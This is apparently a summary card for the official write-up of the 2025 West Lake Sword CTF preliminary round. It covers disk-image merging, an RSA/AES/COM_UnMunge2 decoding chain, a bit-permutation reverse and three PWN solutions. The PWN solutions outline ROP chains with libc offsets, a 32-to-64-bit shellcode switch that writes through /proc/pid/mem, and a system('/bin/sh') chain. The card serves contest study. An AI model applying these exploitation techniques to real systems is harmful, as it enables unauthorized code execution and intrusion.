---
title: 第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write Up(下)
contest: 西湖论剑
year: 2025
difficulty: hard
vuln_type: misc_unknown
tags: [Disk取证-compressed,Zstandard,COM_UnMunge2解码,AES-CBC+HMAC,PWN-babytrace,Heaven's door-32/64切换+proc-mem,Vpwn-栈溢出-edit高地址,RE-BitDance位重排]
attack_chain: MISC-糟糕的磁盘: img1-5 gSoNiXLC/uGZ85OzT/m8X4exzG/Fsiq6lKn/suPVGqm6顺序合并|CSCS: 5张img合并+RSA+已知p/q(差6)+AES-CBC+HMAC-SHA256+COM_UnMunge2(XOR+LongSwap+表)→secret.pcapng|Heaven's door: i386 32位shellcode + retfq切64位 + open /proc/{pid}/mem + lseek + write madain_heaven|BitDance: 767位BitDanceDecode box[223,64,650,...]位重排|新CSCS: AES-128-CBC(b'abcdefghijklmnop') + HMAC验证|PWN-babytrace: int3(0x1723F8)+pop rax链+add rsp,0x78 ret + read /flag|Vpwn: StackVector.show+edit索引18-25写32位+32位高地址拼64位ROP
key_payload: img1..5 合并|sha256(AES_key + HMAC_key) = hashlib.sha256(raw_aes_keys).digest()|int3+pop rax(0x1723F8)+call j_strncmp+setz al+jmp add rsp,8 ret|rop_chain=p64(rdi)+p64(0)+p64(rsi)+p64(write_able)+p64(rdx)+p64(8)+p64(read)+...+p64(int3)+p64(stack+0x200)|bit_box[223,64,650,471,493,580,763,459,754,349,...] 767位|edit(18, pop_rdi&0xffffffff) edit(19, (pop_rdi>>32)&0xffff)
one_liner: 第八届西湖论剑下半:MISC糟糕的磁盘(5张img合并)→RSA+AES-CBC+HMAC+COM_UnMunge2解码UDP stream→secret.pcapng|PWN-babytrace(int3+pop rax+add rsp,0x78 ret读/flag)+Heaven's door(32/64切换+open /proc/pid/mem+lseek+write)+Vpwn(StackVector.edit高32/低32写64位ROP)|RE-BitDance(767位BitDanceDecode box位重排)
lesson: 1) 磁盘取证合并:多img按特定顺序(gSoNiXLC等)合并为完整磁盘; 2) COM_UnMunge2算法:=XOR seq→_LongSwap(c)→XOR ~seq→4字节内j循环表mungify_table2; 3) Heaven's door:32位shellcode入口+retfq+CS 0x33切换64位+open /proc/{pid}/mem+lseek(SEEK_SET,made_in_heaven)+write shellcode; 4) babytrace:libc-2.35 int3+pop rax+add rsp,0x78 ret; 5) Vpwn:StackVector 64位地址分两次写(低32+高32)+edit(18..25)对应位置; 6) BitDance:BitDanceDecode用box[223,64,650,...]做位重排,cipher[0]>>7取srcBit,循环count=len*8次
quality: high
---

## 备注

原文(https://www.ctfiot.com/226338.html)第八届西湖论剑官方下半WriteUp。涵盖MISC/PWN/REVERSE。

### 题目详情

**MISC-糟糕的磁盘**
- 5张img按顺序合并:
  - img1.img → gSoNiXLC.img
  - img2.img → uGZ85OzT.img
  - img3.img → m8X4exzG.img
  - img4.img → Fsiq6lKn.img
  - img5.img → suPVGqm6.img

**MISC-CSCS** (扩展)
- 已知完整n (RSA public key 0x30819e30...)
- p=7605291...6221, q=7605291...6527 (差6)
- e=0x10001, d=inverse(e,phi)
- PKCS1_v1_5解密base64密文(检测\x00\x00\xBE\xEF)
- raw_aes_keys=ciphertext[8:24]
- aes_key=sha256(raw_aes_keys).digest()[:16]
- hmac_key=sha256(raw_aes_keys).digest()[16:]
- AES-128-CBC(iv='abcdefghijklmnop')
- 二次解密:COM_UnMunge2(c, len, seq[0])
  ```
  c ^= seq
  for j in 0..3: c[i] ^= (0xa5 | (j<<j) | j | mungify_table2[(i+j)&0xf])
  c = _LongSwap(c)
  c ^= ~seq
  ```
- 取出secret.pcapng

**PWN-babytrace**
- libc-2.35 amd64
- int3(0x1723F8)+pop rax(0x1723F9)+call j_strncmp+setz al+add rsp,8+retn
- gadget=libc+0x1144e6 (add rsp,0x78; ret)
- rop_chain=prdi(0)+prsi(write_able)+prdx(8)+read(0x1145e0)+prdi(write_able)+prsi(write_able)+prdx(3)+int3+stack+0x200
- p.send("/flag\x00")

**PWN-Heaven's door**
- i386 32位shellcode:open /proc/{pid}/mem
- retfq切换64位(CS=0x33)
- lseek(SEEK_SET, made_in_heaven)+write shellcode
- child_pid从puchid获取

**PWN-Vpwn**
- StackVector add+show+edit菜单
- 8次add(100)+show泄libc_base=libc_addr-0x29d90
- pop_rdi/binsh/system分32位高低地址edit:
  - edit(18, pop_rdi&0xffffffff)
  - edit(19, (pop_rdi>>32)&0xffff)
  - edit(20, bin_sh&0xffffffff)
  - edit(21, (bin_sh>>32)&0xffff)
  - edit(22, (pop_rdi+1)&0xffffffff)
  - edit(23, ((pop_rdi+1)>>32)&0xffff)
  - edit(24, system&0xffffffff)
  - edit(25, (system>>32)&0xffff)
- menu(5)触发

**REVERSE-BitDance**
- BitDanceDecode(cipher, len)
- 767位box[223,64,650,471,493,580,763,459,754,349,393,417,643,638,...]
- srcBit=cipher[0]>>7
- count=len*8
- while count--: dwBitSrcIdx=box[index], destBit=(cipher[dwBitSrcIdx>>3]>>(7-(dwBitSrcIdx&7)))&1, cipher[dwBitSrcIdx>>3]^=(srcBit^destBit)<<(7-(dwBitSrcIdx&7)), srcBit=destBit, index++
- flag[] = {0x0C,0x61,0x48,0x3A,...,0x4C,0x00}

## 评级

- **quality: high** — 多方向题解,磁盘取证合并+COM_UnMunge2反编码+32/64模式切换proc/pid/mem+BitDance位重排全套
- **vuln_type: misc_unknown** — 多方向混合
- 实战价值:Heaven's door模式(32位转64位+proc/pid/mem)是Windows/ELF跨位宽高阶PWN
